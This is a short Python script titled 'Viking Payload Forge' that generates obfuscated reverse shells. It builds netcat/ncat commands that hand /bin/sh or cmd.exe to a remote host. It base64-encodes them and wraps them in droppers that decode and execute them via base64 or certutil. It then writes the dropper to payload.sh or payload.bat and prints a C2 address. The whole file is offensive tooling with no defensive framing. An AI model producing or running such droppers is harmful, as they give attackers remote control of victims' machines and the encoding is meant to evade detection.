# payloads.py – Viking Payload Forge (Obfuscated Reverse Shells)
import base64
import os

def gen_reverse_shell(host, port=4444, os_type='linux'):
    if os_type == 'linux':
        cmd = f'nc {host} {port} -e /bin/sh'
    else:  # win
        cmd = f'ncat {host} {port} -e cmd.exe'  # ncat for Win
    encoded = base64.b64encode(cmd.encode()).decode()
    if os_type == 'linux':
        dropper = f'echo "{encoded}" | base64 -d > shell.sh && chmod +x shell.sh && ./shell.sh'
    else:
        dropper = f'echo {encoded} | certutil -decode payload.txt payload.bat && payload.bat'  # Win certutil
    return dropper

def drop_payload(os_type='linux', host='localhost', port=4444):
    payload = gen_reverse_shell(host, port, os_type)
    if os_type == 'linux':
        filename = 'payload.sh'
    else:
        filename = 'payload.bat'
    with open(filename, 'w') as f:
        f.write(payload)
    print(f"💣 Dropped: {filename} (C2: {host}:{port} | OS: {os_type})")
    print(f"Encoded: {gen_reverse_shell(host, port, os_type)}")
    return payload

if __name__ == '__main__':
    drop_payload('win', '127.0.0.1', 4444)  # Local Win test